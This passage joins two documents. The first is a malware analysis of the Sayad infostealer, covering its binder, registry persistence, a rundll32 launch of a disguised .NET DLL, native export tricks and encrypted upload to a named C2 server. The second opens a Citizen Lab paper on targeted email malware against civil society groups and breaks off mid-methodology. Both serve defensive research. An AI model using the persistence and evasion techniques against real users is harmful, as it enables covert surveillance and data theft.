Details along with snippets from Binder 's source code are provided in the next sections .
This is what the two files dropped by the self - extracting malware look like in Windows Explorer .
They are stored in a temporary location C : \Users\ [ User ] \AppData\Local\Temp\IXP000.TMP .
After dropping the Binder and its configuration file , the main self - extracting binary launches the Binder ( ~8f60957b3689075fa093b047242c0255.exe ) .
Similar to the process tree from our Vinsula report above , the below screenshot from Process Explorer shows the Binder being launched by the self - extracting binary .
The purpose of the Binder is to create and drop the core malware component ( also titled Client – DiagnosticsService.dll ) and its configuration disguised as a DLL file , base.dll .
Below is a snippet from our Vinsula report capturing the relevant event entries that show the Client and its configuration being created .
These are the hashes of the two core Client related files : Before digging into the details of the Client , lets have a look at the Binder 's ( ~8f60957b3689075fa093b047242c0255.exe ) implementation .
The Binder is a .NET
executable whose purpose is to find out what version of .NET
is currently installed , and then drop the relevant .NET
Client DLL accordingly .
There are two versions of the Client DLL that are stored as embedded resources in Binder 's executable .
That makes the malware less chattier and allows it to drop the correct .NET
version DLL without the need to download it from a malicious Web location .
As shown in the above screenshot , in the Binder 's main entry point , the Sayad malware : gets the installed .NET
versions modifies the registry so that it will run at startup using rundll32.exe Windows utility to load the Client ( DiagnosticsService.dll ) extracts the relevant .NET
Client version from the embedded resource depending on the installed .NET
version , it copies the Client ( CopySayad method ) to a user 's directory extract the configuration information from the end of the Binder 's image using the method ReadExtraDataFromEndOfBuffer starts up the Client using the command rundll32.exe `` C : \Users\ [ User ] \AppData\Roaming\Client\DiagnosticsService.dll '' , 7812 The following diagram reflects the code paths in Binder 's Main entry point as described in the section above .
The Binder ensures that the malware will survive reboots by registering the command for loading and executing the Client DLL ( DiagnosticsService.dll ) to run at startup as shown below .
The following shows the registry modification that comes as a result of the executing the code above .
And here is the corresponding registry modification entries from Vinsula 's report .
More on the details regarding the rundll32.exe command will be provided in the following sections .
An interesting aspect of the implementation of the Binder assembly is the way the malware authors decided to launch the Client by executing the command rundll32.exe `` DiagnosticsService.dll '' , 7812 and utilizing WinExec API to launch the rundll32.exe process as shown below .
The WinExec API has been provided only for backward compatibility with 16-bit Windows .
A quick Googling of the method names of the two methods FromUrlSafeBase64String ToUrlSafeBase64String from the Base64.cs file shows that the code has been copied from the following stackoverflow post `` .NET
MVC Routing w/ Url Encoding Problems '' .
The following screenshot shows the Binder project in Visual Studio .
As previously mentioned , the Binder extracts the relevant Client DLL according to the installed .NET
version .
There are two copies of the Client DLL , targeting .NET2
and .NET4
, both stored as embedded resources inside the Binder file image .
The Binder is also responsible for extracting the configuration data located at the end of the Binder 's file image and storing it in the base.dll file .
The configuration data is stored as plain text and Base64 encoded data and holds following configuration attributes : Here is a sample configuration file base.dll The most interesting aspect of this malware is surely the Sayad Client ( DiagnosticsService.dll ) .
The malware authors decided to implement the core data collection and transmission into a single .NET
DLL .
Typically , unknown .NET
DLLs do not look as suspicious as a native Win32 DLL or an executable .
Also , a DLL requires an executable to load it in order to execute any code implemented by the DLL .
Sayad leverages rundll32.exe , which is a shell that allows the loading of 32-bit DLLs and the execution of exported APIs .
Basically , Sayad Client is a 32-bit .NET
DLL .
Rundll32.exe would be able to load Sayad Client DLL , but as it is a .NET
managed DLL it does n't support exporting of native unmanaged APIs , thus Rundll32.exe can not execute any of the .NET / C
# public methods implemented in the Sayad Client DLL .
Going back to the malware process tree we can see that Binder launches the following command , which is instructing Windows utility rundll32.exe to load Sayad Client DiagnosticsService.dll , obtain the function address of the native API named `` 78121 '' via GetProcAddress ( ) , and call the function pointer of the entry point `` 78121 '' .
rundll32.exe `` C : \Users\ [ User ] \AppData\Roaming\Client\DiagnosticsService.dll '' , 78121 Microsoft C # compiler does not support interop via the export of unmanaged native APIs from within a .NET / C
# DLL .
However , if we open Sayad Client DLL it is clear that the DLL does export a native unmanaged API function titled `` 78121 '' .
How have the malware authors managed to export a native API from a C # DLL ? Although not supported by Microsoft , this is not impossible if after building the executable , the MSIL is modified to map a managed static method to the name of a native unmanaged API and then export the API so that it appears in the Export Address Table of the managed PE ( Portable Executable ) image .
In this case , a static method Main ( ) of Program class located in Program.cs of the Sayad Client DLL ( DiagnosticsService.dll ) maps to the native API '' 78121 '' .
As shown below , a special declaration is applied to ensure that the caller ( rundll32.exe ) executes a method matching the required _ _ stdcall calling convention .
Here is the MSIL of the static Main ( ) method .
And below is the corresponding disassmebled C # version .
Sayad Client DLL 's main entry point initializes and starts up all data collection methods that the assembly implements .
The code below is executed by using the command rundll32.exe `` C : \Users\ [ User ] \AppData\Roaming\Client\DiagnosticsService.dll '' , 7812 The malware authors left some debugging messages that indicate the different stages of the Sayad Client initialization .
The code also handles and collects all uncaught exceptions thrown during the execution of the malware by attaching to AppDomain . UnhandledException and Application . ThreadException events .
In the next step , the client loads the configuration discussed in a previous section and then proceeds to start up all data collection components , as shown in the snippet below .
The Sayad Client uses a very trivial method for uploading the encrypted user and host data to the malicious server .
Here is the UploadBuffer method that uses .NET
WebClient class to upload the data .
Both the Binder and the Sayad Client have been built with debugging information which reveals some details about the source code locations for these two .NET
projects .
f : \Projects\C # \Sayad\Source\Binder\obj\Debug\Binder.pdb F : \Projects\C # \Sayad\Source\Client\bin\x86\Debug\Client.pdb Network Activity Communication with the C2 server is limited to transferring collected data from the user and the host to the C2 server .
The stolen data being uploaded to the malicious server is encrypted first using a RSA public key which is stored in the malware configuration file .
The Sayad Client ( DiagnosticsService.dll ) implements an HTTP client that uploads the encrypted data to the malicious Web server with host name '' 0o0o0o0o0 [ dot ] com '' and IP address 107.6.182.179 .
The Binder component does n't implement any communication features .
The following is a short segment from Vinsula network activity report .
According to the http : //www.ipligence.com / geolocation service , the malicious Web server is located in the Netherlands .
Below is the WHOIS information for the malicious host 0o0o0o0o0 [ dot ] com ( IP 107.6.182.179 ) .
The domain was registered on June 30 , 2014 .
Interestingly , the registrant , admin and tech email addresses are domain @ microsofts.com .
One wonders if the registrar , OnlineNIC , Inc , is verifying whether or not these are real email addresses .
YARA detection rule Based on the details that have been identified , we can create two simple YARA rules for detection of the Sayad Binder and Sayad Client .
Hopefully this will help other malware researchers and security companies .
Tools used for dissecting Sayad ( Update 24th of July , 2014 ) We ' ve received a request to list the tools used for analyzing Sayad malware .
Hope that would help other researchers .
Summary With this particular sample , the malicious server – as of this writing – is up and running .
The Sayad malware does n't seem to be implementing any sophisticated mechanisms for collecting and transmitting the stolen data .
Seth Hardy§ Masashi Crete - Nishihata§ Katharine Kleemola§ Adam Senft§ Byron Sonne§ Greg Wiseman§ Phillipa Gill† Ronald J. Deibert§ § The Citizen Lab , Munk School of Global Affairs , University of Toronto , Canada † Stony Brook University , Stony Brook , USA Targeted attacks on civil society and non - governmental organizations have gone underreported despite the fact that these organizations have been shown to be frequent targets of these attacks .
In this paper , we shed light on targeted malware attacks faced by these organizations by studying malicious e - mails received by 10 civil society organizations ( the majority of which are from groups re- lated to China and Tibet issues ) over a period of 4 years .
Our study highlights important properties of malware threats faced by these organizations with implications on how these organizations defend themselves and how we quantify these threats .
We ﬁnd that the technical sophis- tication of malware we observe is fairly low , with more effort placed on socially engineering the e - mail con- tent .
Based on this observation , we develop the Targeted Threat Index ( TTI ) , a metric which incorporates both so- cial engineering and technical sophistication when as- sessing the risk of malware threats .
We demonstrate that this metric is more effective than simple technical sophis- tication for identifying malware threats with the high- est potential to successfully compromise victims .
We also discuss how education efforts focused on changing user behaviour can help prevent compromise .
For two of the three Tibetan groups in our study simple steps such as avoiding the use of email attachments could cut document - based malware threats delivered through e - mail that we observed by up to 95 % .
Civil society organizations ( CSOs ) , working on hu- man rights issues around the globe , face a spectrum of politically - motivated information security threats that seek to deny ( e.g .
Internet ﬁltering , denial - of - service at- tacks ) , manipulate ( e.g .
website defacements ) or moni- tor ( e.g .
targeted malware ) information related to their work .
Targeted malware attacks in particular are an in- creasing problem for CSOs .
These attacks are not iso- lated incidents , but waves of attacks organized in cam- paigns that persistently attempt to compromise systems and gain access to networks over long periods of time while remaining undetected .
These campaigns are cus- tom designed for speciﬁc targets and are conducted by highly motivated attackers .
The objective of these cam- paigns is to extract information from compromised sys- tems and monitor user activity and is best understood as a form of espionage .
CSOs can be particularly suscep- tible to these threats due to limited resources and lack of security awareness .
Targeted malware is an active re- search area , particularly in private industry .
However , focused studies on targeted attacks against CSOs are rel- atively limited despite the persistent threats they face and the vulnerability of these groups .
In this study , we work with 10 CSOs for a period of 4 years to characterize and track targeted malware cam- paigns against these groups .
With the exception of two groups that work on human rights in multiple countries , the remaining eight groups focus on China and Tibet- related human rights issues .
We focus on targeted mal- ware typically delivered via e - mail that is speciﬁcally tai- lored to these groups as opposed to conventional spam which has been well characterized in numerous previous works .
We consider the threats to these groups along two axes : the technical sophistica- tion of the malware as well as sophistication of the so- cial engineering used to deliver the malicious payload .
We combine these two metrics to form an overall threat ranking that we call the Targeted Threat Index ( TTI ) .
While other scoring systems exist for characterizing the level of severity and danger of a technical vulnerabil- ity , no common system exists for ranking the sophistication of targeted e - mail attacks .
TTI allows us to gain insights into the relative sophistication of so- cial engineering and malware leveraged against CSOs .
A key to the success of our study is a unique method- ology , combining qualitative and technical analysis of e - mails and their attachments with ﬁeldwork ( e.g .
site visits ) and interviews with affected CSOs .
This method- ology , which we describe in more detail in Section 3 , al- lows us to both accurately rate the level of targeting of e- mail messages by interfacing with CSOs participating in our study ( Section 4.2 ) , and understand the relative tech- nical sophistication of different malware families used in the attacks ( Section 4.3 ) .
By combining the strengths of our qualitative and quantitative analysis , we are able to accurately understand trends in terms of social engineer- ing and technical sophistication of politically - motivated targeted malware threats faced by CSOs .
Our study makes the following observations , which have implications for security strategies that CSOs can employ to protect themselves from targeted malware : Attachments are the primary vector for email based targeted malware .
More than 80 % of malware deliv- ered to Tibet - related organizations in our study and sub- mitted to us is contained in an e - mail attachment .
Fur- ther , for 2 of the 3 Tibetan organizations in our study ( with at least 40 submitted e - mails ) , simply not opening attachments would mitigate more than 95 % of targeted malware threats that use email as a vector .
Targeted malware technical sophistication is low .
So- cial engineering sophistication is high We ﬁnd that the technical sophistication of targeted malware deliv- ered to CSOs in our study is relatively low ( e.g. , rela- tive to commercial malware that has been found targeting CSOs and journalists and conventional ﬁnan- cially motivated malware ) , with much more effort given to socially engineering messages to mislead users .
This ﬁnding highlights the potential for education efforts fo- cused on changing user behaviours rather than high - cost technical security solutions to help protect CSOs .
CSOs face persistent and highly motivated actors .
For numerous malware samples in our study we ob- serve several versions of the software appearing over the course of our four year study .
These multiple ver- sions show evidence of technical improvements to com- plement existing social engineering techniques .
Since the start of our study we have participated in a series of workshops with the participating Tibetan or- ganizations to translate these results into a training cur- riculum .
Speciﬁcally , we have educated them about how to identify suspicious e - mail headers to identify spoofed senders and demonstrated tools that can be used to check e - mailed links for malware and drive - by - downloads .
The rest of the paper is structured as follows .
Sec- tion 2 presents relevant background on targeted malware and attacks on CSOs .
Our data collection methodology is described in Section 3 .
We describe our targeting and technical sophistication metrics as well as how we com- bine them to produce the Targeted Threat Index ( TTI ) in Section 4 .
Training and outreach implications of our work are discussed in Section 5 .
We present related work in Section 6 and conclude in Section 7 .
2.1 Targeted Malware Overview Targeted malware are a category of attacks that are dis- tinct from common spam , phishing , and ﬁnancially mo- tivated malware .
Spam and mass phishing attacks are indiscriminate in the selection of targets and are directed to the largest number of users possible .
Similarly , ﬁnan- cially motivated malware such as banking trojans seek to compromise as many users as possible to maximize the potential proﬁts that can be made .
The social engi- neering tactics and themes used by these kinds of attacks are generic and the attack vectors are sent in high vol- umes .
By contrast targeted malware attacks are designed for speciﬁc targets , sent in lower volumes , and are moti- vated by the objective of stealing speciﬁc sensitive data from a target .
Targeted malware attacks typically involve the follow- ing stages : Reconnaissance : During this stage attackers conduct research on targets including proﬁling systems , software , and information security defenses used to identify possi- ble vulnerabilities and contextual information on person- nel and activities to aid social engineering .
Delivery : During this stage a vector for delivering the attack is selected .
Common vectors include e - mails with malicious documents or links , or contacting targets through instant messaging services and using social en- gineering to send malware to them .
Typically , a target of such an attack receives an e - mail , possibly appearing to be from someone they know , containing text that urges the user to open an attached document ( or visit a web- site ) .
Compromise : During this stage malicious code is exe- cuted on a target machine typically after a user initiated action such as opening a malicious document or link .
Command and Control : During this stage the infected host system establishes a communications channel to a command and control ( C & C ) server operated by the at- tackers .
Once this channel has been established the at- tackers can issue commands and download further mal- ware on to the system Additional attacker actions : After a successful com- promise is established , attackers can conduct a number of actions including ex - ﬁltrating data from the infected host and transmitting it back to attackers through a process of encrypting , compressing , and transferring to a server 2 operated by the attackers .
Attackers may also use pe- ripherals such as webcams and microphones to monitor users in real time .
The infected host may also serve as a starting point to infect other machines on the network and seek out speciﬁc information or credentials .
2.2 Targeted Malware and CSOs Targeted malware has become recognized by govern- ments and businesses around the world as a serious po- litical and corporate espionage threat .
The United States government has been particularly vocal on the threat tar- geted malware enabled espionage poses .
General Keith Alexander , current Director of the National Security Agency and Commander of United States Cyber Com- mand has stated that the theft of US intellectual property through cyber espionage constitutes the `` greatest transfer of wealth in history '' .
Recent widely publicized tar- geted malware intrusions against Google , RSA , the New York Times and other high proﬁle targets have raised public awareness around these attacks Despite this increased attention , targeted malware is not a new problem , with over a decade of public reports on these kinds of attacks .
However , the majority of research on targeted malware is conducted by private security companies who typically focus on campaigns against industry and government entities .
As a result , tar- geted attacks on civil society and non - governmental or- ganizations have gone underreported despite the fact that these organizations have been shown to be frequently targeted by cyber espionage campaigns .
In particular , communities related to ethnic minority groups in China including Tibetans , Uyghurs , and religious groups such as Falun Gong have been frequent targets of cyber es- pionage campaigns with reports dating back to at least 2002 .
In some cases , the same actors have been revealed to be targeting civil society groups , government and indus- try entities .
A notable example of this was the 2009 re- port by the Citizen Lab , a research group at the Univer- sity of Toronto , which uncovered the `` GhostNet '' cyber espionage network .
GhostNet successfully compromised prominent organizations in the Tibetan community in ad- dition to 1,295 hosts in 103 countries , including min- istries of foreign affairs , embassies , international organi- zations , and news media .
The GhostNet case is not an isolated example , as other reports have shown CSOs ( commonly Tibetan organizations ) included as targets in campaigns that are also directed to a range of govern- ment and industry entities Some of these reports include technical details on the CSO spe- ciﬁc attacks while others note them as a target but do not address in detail .
While the majority of documented targeted malware campaigns against CSOs involve China and Tibet - related groups and potentially China - related attack operators , these kinds of at- tacks go beyond China .
Recent research and news media have reported attacks against large human rights groups focused on multiple issues and countries , and communities related to Syria and Iran .
Re- searchers have also uncovered the use of commercial network intrusion products used to target activists from Bahrain , the United Arab Emirates , and jour- nalists from Ethiopia .
Since our study involves dealing with e - mail messages which may contain personally identiﬁable information ( PII ) and collection of information from CSOs who need to maintain privacy of their data , we consulted with our institutional research ethics board during the design of our study .
The methods described below have been sub- mitted to and approved by this board .
3.1 Study Participants We recruited participants via three main channels : ( 1 ) an open call on our Web site , ( 2 ) outreach to organi- zations we had prior relationship with and ( 3 ) referrals from participating groups .
As part of the study these groups agreed to share technical data ( e.g. , e - mails with suspicious attachments ) and participate in interviews at the onset and end of the study .
Their identity and any PII shared with us were kept strictly conﬁdential .
For the purposes of our study , we focused on organiza- tions with missions concerning the promotion or protec- tion of human rights .
For purposes of this study , `` human rights '' means any or all of the rights enumerated under the Universal Declaration of Human Rights , the In- ternational Covenant on Civil and Political Rights , and the International Covenant on Economic , Social and Cultural Rights .
We also considered organizations on a case by case basis that have a mission that does not directly implicate human rights , but who may nonethe- less be targeted by politically motivated digital attacks because of work related to human rights issues ( e.g. , me- dia organizations that report on human rights violations ) .
In total , 10 organizations participated in the study ( summarized in Table 1 ) .
The majority of these groups work on China - related rights issues and ﬁve of these or- ganizations focus speciﬁcally on Tibetan rights .
The high rate of participation from China and Tibet - related human rights issues is due in part to our previous relationships with these communities and a signiﬁcant interest and en- thusiasm expressed by the groups .
In addition to the China and Tibet - related groups , our study also includes 3 two groups , Rights Group 1 and 2 that work on multiple human rights related issues in various countries .
The majority of organizations operate from small of- ﬁces with less than 20 employees .
Some organizations ( China Group 2 , Tibet Group 2 ) have no physical ofﬁce and consist of small virtual teams collaborating remotely , often from home ofﬁces .
Of these groups only two ( China Group 1 , China Group 3 ) have a dedicated system administrator on staff .
Other groups ( Tibet Groups 1 - 5 ; China Group 2 ) rely on volunteers or staff with related technical skills ( e.g .
Web development ) to provide tech- nical support .
Rights Group 1 and Rights Group 2 are much larger organizations relative to the others in our sample .
Both organizations have over 100 employees , multiple ofﬁces , dedicated IT teams , and enterprise level computing infrastructures .
3.2 Data Sources We collect the following pieces of information from the participant groups in order to understand the malware threats they face : User - submitted e - mail messages .
Our primary data source is a collection of e - mails identiﬁed by participants as suspicious which were forwarded to a dedicated e- mail server administered by our research team .
When available these submissions included full headers , ﬁle attachments and / or links .
There are three key limita- tions to relying on user - submitted e - mails for our anal- ysis .
First , we are only able to study e - mails identiﬁed by participants as suspicious , which may bias our re- sults to only reporting threats that have been ﬂagged by users .
Further , individuals may forget to forward e - mails in some cases .
Relying on self - reporting also creates bias between groups as individuals at different organizations may have different thresholds for reporting , which cre- ates difﬁculties in accurately comparing submission rates between groups .
Thus the amount of threat behaviour we see should be considered a lower bound on what oc- curs in practice .
Second , having participants forward us e - mails does not allow us to verify if the targeted organi- zation was successfully compromised by the attack ( e.g. , if another member of the organization open and executed malware on their machine ) and what the scope of the at- tack was .
Finally , e - mail is only one vector that may be used to target organizations .
Other vectors include water- hole attacks , denial of service attacks , or any other vectors ( e.g. , physical threats like infected USB sticks ) .
These limitations mean that it is possible that we did not comprehensively observe all attacks experienced by our study groups and some more advanced attacks may have gone unreported .
Recognizing the limitations of e - mail submissions , we complement user submitted emails with data from Net- Table 2 : Breakdown of e - mails submitted per group .
work Intrusion Detection System ( NIDS ) alerts , web- site monitoring , and interviews .
Also , upon request of study groups who were concerned of possible infection we analyzed packet capture data from suspect machines .
Through the course of this supplementary analysis we did not ﬁnd indications of malware compromise that used samples that were not included in our pool of user- submitted emails .
In this paper we focus on reporting results from analyzing the user submitted emails through the TTI .
The NIDS and website monitoring components were added later in our study and do not signiﬁcantly contribute to TTI analysis .
3.3 Overview of User - Submitted E - mails The e - mails examined in this study span over four years , from October 14 , 2009 to December 31 , 2013 .
Data col- lection began on November 28 , 2011 , but China Group 3 and Tibet Group 1 forwarded us their pre - existing archives of suspicious emails , resulting in e - mail sam- ples dating back to October 14 , 2009 .
In total , we re- ceived 817 e - mails from the 10 groups participating in our study .
Table 2 breaks down the submissions from each groups and illustrates that submissions were highly non - uniform across the groups .
Thus , in general , we fo- cus on the groups with at least 50 e - mail submissions for our analysis .
Figure 1 shows the cumulative number of e - mail sub- missions per month over the course of the study .
For example , China Group 3 shared a set of e - mails received in 2010 by a highly targeted member of the organization , which can be observed in Figure 1 .
Tibet Group 1 ac- counts for the highest number of submissions relative to the other groups due to being one of the ﬁrst groups in the study and being persistently targeted by politically motivated malware .
Tibetan Groups 2 and 4 , who joined the study later ( in April 2012 ) show a similar submission rate to original Tibetan Group 1 , suggesting these groups are targeted at a similar rate .
In Section 4.2 , we investi- 4 Table 1 : Summary of groups participating in our study .
Figure 1 : Cumulative number of messages per group over the course of our study for groups that submitted at least 50 e - mail messages .
Figure 2 : Breakdown of malicious e - mails based on whether they deliver malware as an attachment , refer use to a link with a malicious ﬁle , or attempt to phish the data from the user .
gate commonalities in targeting of these groups .
We further classify e - mails as malicious if they include attached malware , a direct link to malware or a site with a drive - by download , or a link to a phishing page .
Fig- ure 2 shows the amount of e - mails of each type for the groups that submitted at least 25 e - mails to our system .
The most common approach employed in these e - mails was attaching a malicious payload to the e - mail itself .
However , we notice a higher rate of phishing attacks on the China - related groups and the rights groups working on multiple international human rights issues .
In partic- ular , 46 % of the e - mails submitted by China Group 1 , and 50 % of the e - mails submitted by Rights Group 1 , di- rect the user to a phishing Web site .
In the case of China Group 1 , this large proportion of phishing sites is ob- served because this group conﬁgured their spam ﬁlter to forward e - mails to our system , resulting in us receiving a large number of generic , non - targeted spam .
In con- trast , the phishing observed for Rights Group 1 , while low in volume ( 13 out of 26 messages ) is targeted .
We delve more into how we rate the targeting of e - mails in Section 4.2 .
The rate of submissions to our project meant that it was feasible to manually analyze e - mail attachments for malware as they were submitted .
This analysis gives us higher conﬁdence in our results because AV signatures are frequently unable to detect new or modiﬁed threats , and can overlook the presence of a malicious payload that can be easily identiﬁed upon manual inspection ( e.g .
shellcode in an RTF exploit ) .
In total , we analyzed 3,617 payload ﬁles and found 2,814 ( 78 % ) of them to be ma- licious .
Section 4.3 describes our analysis methodology in more detail .
Our dataset includes a wide range of targeted malware threats varying in level of both social engineering and technical complexity .
This range presents a challenge in ranking the relative sophistication of the malware and targeting tactics used by attackers .
While scoring systems such as the Common Vulnera- bility Scoring System exist for the purpose of com- municating the level of severity and danger of a vul- nerability , there is no standardized system for ranking 5 the sophistication of targeted email attacks .
This gap is likely because evaluating the sophistication of the target- ing is non - technical , and can not be automated due to the requirement of a strong familiarity with the underlying subject material .
To address this gap we developed the Targeted Threat Index ( TTI ) to assign a ranking score to the targeted ma- licious emails in our dataset .
The TTI score is intended for use in prioritizing the analysis of incoming threats , as well as for getting an overall idea of how severely an organization is threatened .
The TTI score is calculated by taking a base value de- termined by the sophistication of the targeting method , which is then multiplied by a value for the technical sophistication of the malware .
The base score can be used independently to compare emails , and the combined score gives an indication of the level of effort an attacker has put into individual threats .
4.1 TTI Metric The TTI score is calculated in two parts : ( Social Engineering Sophistication Base Value ) × ( Technical Sophistication Multiplier ) = TTI Score TTI scores range from 1 to 10 , where 10 is the most sophisticated attack .
Scores of 0 are reserved for threats that are not targeted , even if they are malicious .
For example , spam using an attached PDF or XLS to by- pass anti - spam ﬁlters , and highly sophisticated ﬁnan- cially motivated malware , would both score 0 .
This section overviews how we compute the Social Engineering Sophistication Base Value ( Section 4.2 ) and the Technical Sophistication Multiplier ( Section 4.3 ) .
In Section 4.4 , we present the results of computing and an- alyzing the TTI value of threats observed by the organi- zations in our study .
We also discuss implications and limitations of the metric .
4.2 Social Engineering Tactics We leverage a manual coding approach to measure the sophistication of social engineering tactics used in the at- tacks observed by the organizations in our study .
While automated approaches may be explored in the future , this manual analysis allows us to have high conﬁdence in our results , especially since understanding the social engi- neering often required contextual information provided by the organizations in our study .
To quantify the level of sophistication , we manually analyse the e - mail subject line , body , attachments and header ﬁelds .
We perform an initial content analysis by coding the e - mails based on their semantic content , and then use these results to gen- erate a numerical metric quantifying the level of targeting used .
4.2.1 Content coding and analysis results We code the e - mails based on their subject line , body , at- tachments and headers using the following methodology : Subject line , body , and attachments .
The content of the subject line , body and attachments for each submitted e - mail were content coded into 8 themes , each contain- ing categories for speciﬁc instances of the theme : Coun- try / Region ( referring to a speciﬁc geographical country or region ) ; Ethnic Groups ( referring to a speciﬁc ethnic group ) ; Event ( referring to a speciﬁc event ) ; Organiza- tions ( referring to speciﬁc organizations ) ; People ( refer- ring to speciﬁc persons ) , Political ( reference to speciﬁc political issues ) , Technology ( reference to technical sup- port ) , Miscellaneous ( content without clear context or categories that do not fall into one of the other themes ) .
Table 3 summarizes the themes and provides examples of categories within each theme .
E - mail headers .
The header of each e - mail was an- alyzed to determine if the sending e - mail address was spoofed or the e - mail address was otherwise designed to appear to come from a real person and / or organiza- tion ( e.g .
by registering an e - mail account that resembles a person and / or organization 's name from a free mail provider ) .
We divide the results based on whether they attempted to spoof an organization or a speciﬁc person .
Using this manual analysis , we perform a content anal- ysis of e - mails submitted by the organizations .
Results of this analysis conﬁrm that social engineering is an im- portant tool in the arsenal of adversaries who aim to de- liver targeted malware .
Speciﬁcally , 95 % and 97 % of e - mails to Chinese and Tibetan groups , respectively , in- cluded reference to relevant regional issues .
Spooﬁng of speciﬁc senders and organizations was also prevalent with 52 % of e - mails to Tibetan groups designed to ap- pear to come from real organizations , often from within the Tibetan community .
For example , a common tar- get of spooﬁng was the Central Tibetan Administration ( CTA ) , referenced in 21 % of the spoofed e - mails , which administers programs for Tibetan refugees living in In- dia and advocates for human rights in Tibet .
While the number of e - mail submissions were lower for the gen- eral human rights groups , we observe similar trends there with 92 % of e - mails submitted by Rights Group 1 ap- pearing to come from individuals in the group ( as a result of spooﬁng ) .
In some cases we even observed the same attackers targeting multiple CSOs with customized e - mail lures .
For example , we tracked a campaign that targeted China Groups 1 and 2 , and Tibet Group 1 with a remote access 6 Table 3 : Overview of themes and categories within the themes for grouping targeted e - mail messages .
trojan we call IEXPL0RE China Group 1 received the malware in e - mails claiming to be from personal friends whereas China Group 2 received the malware in an e - mail containing a story about a high - rise apartment building ﬁre in China .
In contrast , Tibet Group 1 re- ceived the malware embedded into a video of a speech by the Dalai Lama , attached to an e - mail about a year in review of Tibetan human rights issues .
4.2.2 Social Engineering Sophistication Base Value While the content analysis results clearly show attacks tailored to the interests of targeted groups , content cod- ing alone does not give a relative score of the sophistica- tion used in the attacks .
We now describe how we assign the `` social engineering sophistication base value '' to e- mails based on their level of social engineering .
To measure the targeting sophistication we assign a score that ranges from 0 - 5 that rates the social engineer- ing techniques used to get the victim to open the attach- ment .
This score considers the content and presentation of the e - mail message as well as the claimed sender iden- tity .
This determination also includes the content of any associated ﬁles , as malware is often implanted into legit- imate relevant documents to evade suspicion from users when the malicious documents are opened .
The Social Engineering Sophistication Base Value is assigned based on the following criteria : 0 Not Targeted : Recipient does not appear to be a spe- ciﬁc target .
Content is not relevant to the recipient .
The e - mail is likely spam or a non - targeted phishing attempt .
1 Targeted Not Customized : Recipient is a speciﬁc target .
Content is not relevant to the recipient or contains information that is obviously false with little to no valida- tion required by the recipient .
The e - mail header and/or signature do not reference a real person or organization .
2 Targeted Poorly Customized : Recipient is a speciﬁc target .
Content is generally relevant to the target but has attributes that make it appear questionable ( e.g .
incom- plete text , poor spelling and grammar , incorrect address- ing ) .
The e - mail header and / or signature may reference a real person or organization .
3 Targeted Customized : Recipient is a speciﬁc target .
Content is relevant to the target and may repurpose legit- imate information ( such as a news article , press release , conference or event website ) and can be externally ver- iﬁed ( e.g .
message references information that can be found on a website ) .
Or , the e - mail text appears to re- purpose legitimate e - mail messages that may have been collected from public mailing lists or from compromised accounts .
The e - mail header and / or signature references a real person or organization .
4 Targeted Personalized : Recipient is a speciﬁc target .
The e - mail message is personalized for the recipient or target organization ( e.g .
speciﬁcally addressed or refer- ring to individual and / or organization by name ) .
Con- tent is relevant to the target and may repurpose legitimate information that can be externally veriﬁed or appears to repurpose legitimate messages .
The e - mail header and / or signature references a real person or organization .
5 Targeted Highly Personalized : Recipient is a spe- ciﬁc target .
The e - mail message is individually person- alized and customized for the recipient and references conﬁdential / sensitive information that is directly rele- vant to the target ( e.g .
internal meeting minutes , com- promised communications from the organization ) .
The e - mail header and / or signature references a real person or organization .
Content coding of emails and determinations of so- cial engineering ratings for the TTI were performed by ﬁve independent coders who were given a code book for content categories and the TTI social engineering scale with examples to guide analysis .
We performed regu- lar inter - rater reliability checks and ﬂagged any poten- tial edge cases and inconsistencies for discussion and re- evaluation .
Following completion of this analysis , two of the authors reviewed the social engineering base value scores to ensure consistency and conformity to the scale .
We provide speciﬁc examples of each of these targeting values in Appendix A .
7 Figure 3 : Social engineering sophistication base value assigned to e - mail submissions from groups that submit- ted at least 50 e - mails .
4.2.3 Summary of Social Engineering Sophistica- tion Base Value Figure 3 shows the targeting score for organizations in our study who submitted at least 50 e - mails .
We can see that actors targeting these groups put signiﬁcant effort into targeting their messages , in particular the three Ti- betan groups included in Figure 3 observe more than half of their messages with a targeting score of 3 or higher .
This result means adversaries are taking care to make the e - mail appear to come from a legitimate individual or or- ganization , and include relevant information ( e.g. , news reports or exchanges from public mailing lists ) .
Higher targeting scores , which result from actions such as per- sonalizing lures to an individual in the group , or includ- ing information that requires prior reconnaissance tend to be more rare , but we do observe instances of them .
For example , in the case of China Group 3 , we observed an e - mail which received a social engineering score of 5 , which claimed to be from the group 's funder and refer- enced a speciﬁc meeting they had planned that was not public knowledge .
4.3 Technical Sophistication We manually analyzed all submitted emails and attach- ments to determine whether they contained politically- motivated malware .
The malware is then analyzed in de- tail to extract information such as the vulnerability , C & C server ( if present ) , and technical sophistication of the ex- ploit .
4.3.1 Assessment methodology The ﬁrst step in our analysis pipeline is determining whether the email contains politically motivated malware or not .
This process involves an initial inspection for social engineering of the email message and attachment ( e.g. , an executable pretending to be a document ) .
We also correlate with other emails received as part of this project to identify already - known malware .
Well - known malware attacks ( e.g. , the Zeus trojan masquerading as an email from the ACH credit card payment processor , or Bredolab malware pretending to be from the DHL courier service ) are not considered targeted attacks in our study , but are still kept for potential review .
Once we have identiﬁed emails which we suspect of containing politically - motivated malware , we perform the following analysis steps on any attachments to ver- ify that they indeed contain malware .
First , we run the attachment in a sandboxed VM to look for malicious ac- tivity e.g. , an Ofﬁce document writing ﬁles to disk or try- ing to connect to a C & C server .
We also check the MD5 hash of the attachment against the Virus Total dto see if it matches existing viruses .
We also manually ex- amine the attached ﬁle for signs of malicious intent ( e.g. , executable payload in a PDF , shellcode or Javascript ) .
We exclude any graphics attached to the email which are used for social engineering ( and do not contain malicious payload ) from our analysis .
We follow this initial analysis with more dtech- nical analysis of the attachments which we conﬁrm con- tain malware .
First , we manually verify the ﬁle type of the attachment for overview statistics .
This manual anal- ysis is necessary as the Unix ﬁle command may be mis- led by methods of manipulating important bytes in the ﬁle ( e.g. , replacing \rtf1 with \rtf [ null ] ) .
We t- tify if the vulnerability included in the malware already exists in a corpus of vulnerabilities , such as the Com- mon Vulnerabilities and Exposures ( CVE ) naming sys- tem .
We also perform analysis of network trafﬁc from the attachment to identify the C & C server the malware attempts to contact .
In cases where the malware does not execute in our controlled environment we manually examine the ﬁle to extract the relevant information .
On a case - by - case basis we use additional tools such as IDA and OllyDbg for detailed static and dy- namic analysis , respectively .
Our goal in this analysis is to identify relationships between malware campaigns between organizations , or instances of the same malware family repeatedly targeting a given organization .
